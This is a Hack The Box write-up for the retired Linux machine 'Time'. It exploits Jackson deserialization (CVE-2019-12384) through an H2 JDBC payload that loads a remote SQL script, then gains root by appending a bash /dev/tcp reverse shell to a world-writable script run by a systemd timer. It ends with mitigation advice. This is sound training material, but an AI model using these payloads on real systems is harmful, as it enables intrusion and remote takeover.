---
machine: Time
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jackson, deserialization, cron, privesc]
---

# Time — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site validates JSON with Jackson and returns the class error, revealing CVE-2019-12384. A payload using the H2 driver runs an SQL script during deserialization and yields a `pericles` shell. A systemd timer runs the world-writable `/usr/bin/timer_backup.sh` every few seconds; adding a reverse shell gives root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` a JSON validation and beautifier tool.
- The site returns full Java exceptions.
- The error mentions `com.fasterxml.jackson.databind`.

## Enumeration

- Jackson allows `$type` and the backend does not block it.
- The version is vulnerable to CVE-2019-12384 through the H2 driver.
- `pericles` has a writable directory and a systemd timer.

## Foothold

Host an SQL script that starts a reverse shell and send JSON with `$type` to `com.sun.rowset.JdbcRowSetImpl` and an H2 JDBC URL with `INIT=RUNSCRIPT`.

```json
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<ATTACKER>/poc.sql'","autoCommit":true}]
```

## Lateral movement

The shell is `pericles`. Local enumeration shows `timer_backup.timer` and `timer_backup.service`, running `/usr/bin/timer_backup.sh` as root.

```bash
systemctl list-timers
cat /etc/systemd/system/timer_backup.service
ls -l /usr/bin/timer_backup.sh
```

## Privilege escalation

The script is world-writable. Append a reverse shell and the timer runs it within five seconds; the resulting process is root.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1' >> /usr/bin/timer_backup.sh
```

## Evidence

- Jackson error and CVE-2019-12384.
- JSON with `JdbcRowSetImpl` and H2 script.
- `pericles` shell.
- Modified `timer_backup.sh` and root.

## Lessons learned

- A detailed error identifies the library and version.
- Jackson polymorphic deserialization can load dangerous classes.
- A writable backup script run by a timer is immediate root.

## Mitigation and detection

- Disable `enableDefaultTyping` and use DTOs.
- Do not return internal exceptions to users.
- Read-only permissions and absolute paths in systemd scripts.

## References

- [0xdf — Time](https://0xdf.gitlab.io/2021/04/03/htb-time.html)
- [IppSec — Time](https://www.youtube.com/watch?v=JfonPpbX-oI)
- [Hack The Box — Time](https://app.hackthebox.com/machines/time)
